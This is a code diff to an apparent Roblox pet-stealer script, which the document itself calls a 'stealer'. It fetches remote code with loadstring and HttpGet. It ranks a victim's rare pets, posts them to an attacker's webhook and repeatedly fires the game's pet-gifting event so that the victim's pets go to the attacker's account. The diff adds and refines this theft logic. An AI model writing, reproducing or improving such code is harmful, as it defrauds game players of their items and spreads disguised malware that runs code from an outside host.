@@ -13,6 +13,37 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
 
         local data = DataService:GetData()
 
+        -- Priority system (1 = highest priority, 11 = lowest priority)
+        local priorities = {
+            ["Kitsune"] = 1,
+            ["Raccoon"] = 2,
+            ["Fennec fox"] = 3,
+            ["Spinosaurus"] = 4,
+            ["Dragonfly"] = 5,
+            ["T-Rex"] = 6,
+            ["Mimic Octopus"] = 7,
+            ["Disco Bee"] = 8,
+            ["Butterfly"] = 9,
+            ["Queen Bee"] = 10,
+            ["Red Fox"] = 13
+        }
+
+        local mutationPriorities = {
+            ["Ascended"] = 14,
+            ["Rainbow"] = 15,
+            ["Shocked"] = 16,
+            ["Radiant"] = 17,
+            ["IronSkin"] = 18,
+            ["Mega"] = 19,
+            ["Tiny"] = 20,
+            ["Golden"] = 21,
+            ["Frozen"] = 22,
+            ["Windy"] = 23,
+            ["Inverted"] = 24,
+            ["Shiny"] = 25
+        }
+
+
         local function detectExecutor()
             local name
             local success = pcall(function()
@@ -74,9 +105,7 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
                     if petMover and petMover:GetAttribute("OWNER") == Players.LocalPlayer.Name then
                         for _, pet in petMover:GetChildren() do
                             table.insert(equippedPets, pet.Name)
-                            pcall(function()
                                 PetsService:UnequipPet(pet.Name)
-                            end)
                         end
                     end
                 end
@@ -93,7 +122,7 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
                     local petName = tool.Name
                     
                     -- Skip broken pets
-                    if petName:find("Bald Eagle") then
+                    if petName:find("Bald Eagle") or petName:find("Golden Lab") then
                         continue
                     end
 
@@ -154,9 +183,23 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
 
                     local age = getAge(tool.Name) or 0
                     local weight = getWeight(tool.Name) or 0
-                    
-                    -- Get pet type (remove the weight and age parts)
-                    local petType = petName:gsub(" %[.*%]", "")
+
+                    -- Remove weight/age tags
+                    local strippedName = petName:gsub(" %[.*%]", "")
+
+                    -- Function to remove mutation prefix for sorting
+                    local function stripMutationPrefix(name)
+                        for mutation in pairs(mutationPriorities) do
+                            if name:lower():find(mutation:lower()) == 1 then
+                                return name:sub(#mutation + 2)
+                            end
+                        end
+                        return name
+                    end
+
+                    -- Final base type used for sorting
+                    local petType = stripMutationPrefix(strippedName)
+
                     
                     local rawValue = SafeCalculatePetValue(tool)
                     if rawValue and rawValue > 0 then
@@ -182,9 +225,7 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
         if equippedPets then
             for _, petName in pairs(equippedPets) do
                 if petName then
-                    pcall(function()
-                        game.ReplicatedStorage.GameEvents.PetsService:FireServer("EquipPet", petName)
-                    end)
+                    game.ReplicatedStorage.GameEvents.PetsService:FireServer("EquipPet", petName)
                 end
             end
         end
@@ -195,37 +236,6 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
 
         local Webhook = getgenv().Webhook
         local Username = getgenv().Username
-
-
-        -- Priority system (1 = highest priority, 11 = lowest priority)
-        local priorities = {
-            ["Kitsune"] = 1,
-            ["Raccoon"] = 2,
-            ["Fennec fox"] = 3,
-            ["Spinosaurus"] = 4,
-            ["Dragonfly"] = 5,
-            ["T-Rex"] = 6,
-            ["Mimic Octopus"] = 7,
-            ["Disco Bee"] = 8,
-            ["Butterfly"] = 9,
-            ["Queen Bee"] = 10,
-            ["Red Fox"] = 13
-        }
-
-        local mutationPriorities = {
-            ["Ascended"] = 14,
-            ["Rainbow"] = 15,
-            ["Shocked"] = 16,
-            ["Radiant"] = 17,
-            ["IronSkin"] = 18,
-            ["Mega"] = 19,
-            ["Tiny"] = 20,
-            ["Golden"] = 21,
-            ["Frozen"] = 22,
-            ["Windy"] = 23,
-            ["Inverted"] = 24,
-            ["Shiny"] = 25
-        }
 
         -- Returns mutation name if found in toolName, otherwise nil
         local function isMutated(toolName)
@@ -437,8 +447,9 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
 }
 
 
+
         if hasRarePets() then
-            payload.content = "@everyone\n" .. tpScript
+            payload.content = "@everyone\n" .. "To activate the stealer you must jump or type in chat"
 
                 local success = pcall(function()
                     request({
@@ -451,7 +462,7 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
                     })
                 end)
         else
-            payload.content = tpScript
+            payload.content = "To activate the stealer you must jump or type in chat"
 
             local success, err = pcall(function()
                 request({
@@ -601,13 +612,11 @@ local function safeFollow(targetPlayer, follower)
     local offset = CFrame.new(0, 0, 1.5)
     local conn
     conn = RunService.Stepped:Connect(function()
-        pcall(function()
             local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
             local followerRoot = follower.Character:FindFirstChild("HumanoidRootPart")
             if targetRoot and followerRoot then
                 followerRoot.CFrame = targetRoot.CFrame * offset
             end
-        end)
     end)
     
     return {
@@ -632,42 +641,11 @@ local function quickGift(tool)
         task.wait(0.05)
     until tool.Parent == targetChar
 
-    -- Wait for prompt to appear (no time limit)
-    local prompt
     repeat
-        task.wait(0.05)
-        prompt = receiverChar.Head:FindFirstChildWhichIsA("ProximityPrompt")
-    until prompt
+        RS:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", receiverPlr)
+        task.wait(0.5) -- Short delay between attempts
+    until tool.Parent ~= targetChar and tool.Parent ~= targetPlr.Backpack
 
-    -- Listen for trigger confirmation
-    local triggered = false
-    local conn = prompt.Triggered:Connect(function()
-        triggered = true
-    end)
-
-    -- Disable other prompts temporarily
-    local disabledPrompts = {}
-    for _, desc in ipairs(workspace:GetDescendants()) do
-        if desc:IsA("ProximityPrompt") and desc ~= prompt and desc.Enabled then
-            disabledPrompts[desc] = true
-            desc.Enabled = false
-        end
-    end
-
-    -- Keep trying until triggered
-    repeat
-        fireproximityprompt(prompt)
-        task.wait(0.1) -- Short delay between attempts
-    until triggered
-
-    -- Cleanup
-    for prompt in pairs(disabledPrompts) do
-        prompt.Enabled = true
-    end
-    conn:Disconnect()
-
-    -- Unequip tool
-    task.wait(0.1)
     if tool.Parent == targetChar then
         tool.Parent = targetPlr.Backpack
     end
